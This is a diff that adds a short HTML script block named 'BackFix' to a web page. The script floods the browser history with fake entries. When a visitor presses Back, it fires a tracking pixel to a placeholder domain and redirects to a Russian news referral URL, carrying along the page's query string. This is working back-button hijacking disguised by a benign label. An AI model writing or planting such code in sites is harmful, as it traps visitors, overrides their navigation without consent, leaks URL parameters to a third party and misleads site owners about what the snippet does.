@@ -1,0 +1,18 @@
+<!-- Start BackFix -->
+  <script>
+    ! function() {
+      var t;
+      try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#rdm' + Math.floor(Math.random() * 10))
+        onpopstate = function(event) {
+          var b = document.createElement("img");
+          b.src = 'http://{domain}/click.php?event9=1';
+          event.state && location.replace('https://newstime24.ru/tn/open?referral=3&stream=2475&utm_source=rudop' + window.location.search);
+        }
+      } catch (o) {
+        console.log(o);
+      }
+    }();
+  </script>
+  <!-- End BackFix -->
